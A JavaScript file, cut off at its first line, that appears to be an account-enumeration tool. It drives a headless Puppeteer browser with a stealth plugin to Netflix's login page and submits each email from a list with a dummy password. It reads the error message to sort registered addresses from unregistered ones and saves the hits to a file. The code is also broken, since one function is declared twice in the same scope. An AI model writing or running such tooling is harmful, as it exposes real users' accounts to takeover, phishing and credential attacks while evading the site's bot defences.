executablePath, TimeoutError, HTTPResponse, }=require('puppeteer');
const proxy=require('puppeteer-page-proxy');
const readline=require('readline');
const input=require('prompt-sync')
const fs=require('fs')
const {writeFile}=require("fs").promises


puppeteer.use(stealthPlugin());

const url='https://netflix.com/login'


const main =async()=>{
    console.log('> starting program')
    const main =async(email)=>{
        let browser= await puppeteer.launch({
            headless:true,
            executablePath:executablePath(),
            // args:['--proxy-server=157.90.159.179:8080']
        })
        let ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
        let page= await browser.newPage();
        await page.setUserAgent(ua)
        try{
        await page.goto(url,{waitUntil:'networkidle2'});

        //const resData =await res.text()
      //  const write=await writeFile("res.txt",resData)
        await page.type('#id_userLoginId',email);
        await page.type('#id_password','123456');
      await page.keyboard.press('Enter')

            await page.waitForNavigation({timeout:10000})
            const extractedText = await page.$eval('*', (el) => el.innerText);
            if(extractedText.includes("Incorrect password")){
                console.log("email available :",email)
                await browser.close()
                return true
            }else if(extractedText.includes("Sorry, we can't find an account with this email address")){
                console.log("email not available :",email)
            }else{
                console.log(extractedText)
            }

        } catch (error) {
        console.log(error)
        }
    }

    const getEmail=async()=>{
        let emailList=[]
        let readStream =  fs.createReadStream('./aolhit.txt');
         const rl= readline.createInterface({
            input: readStream,
            crlfDelay: Infinity
         });
        for await (const line of rl){
            emailList.push(line);
        }
       return emailList;
    }
    const getCheckedEmails=async()=>{
        let emailList=[]
         let readStream =  fs.createReadStream('./checkedemails.txt');
         const rl= readline.createInterface({
                    input: readStream,
                    crlfDelay: Infinity
         });
                 for await (const line of rl){
                     emailList.push(line);
                 }
                return emailList;
             }
             const getCheckedEmails=async()=>{
                 let emailList=[]
                  let readStream =  fs.createReadStream('./checkedemails.txt');
                  const rl= readline.createInterface({
                             input: readStream,
                             crlfDelay: Infinity
                          });
                         for await (const line of rl){
                             emailList.push(line);
                         }
                   return emailList;
             }
             let emailList=await getEmail();
             const loop =async ()=>{
                 const checkedEmails=await getCheckedEmails()
                 for (const email of emailList) {
                     let checker;
                     for (const cEmail of checkedEmails){
                     if (cEmail===email){
                         checker="email found"
                     }
                     }
                     if(checker!=="email found"){
                     let result= await main(email)
                     if (await result===true) {
                         let write=fs.createWriteStream('./hit.txt',{flags:'a'});
                         write.write(`${email}\n`);
                     }
                     let writes=fs.createWriteStream('./checkedemails.txt',{flags:'a'});
                     writes.write(`${email}\n`);
                     }
                 }
               return true
             }
            console.log(await loop())
             console.log("> ended")
         }
          main()
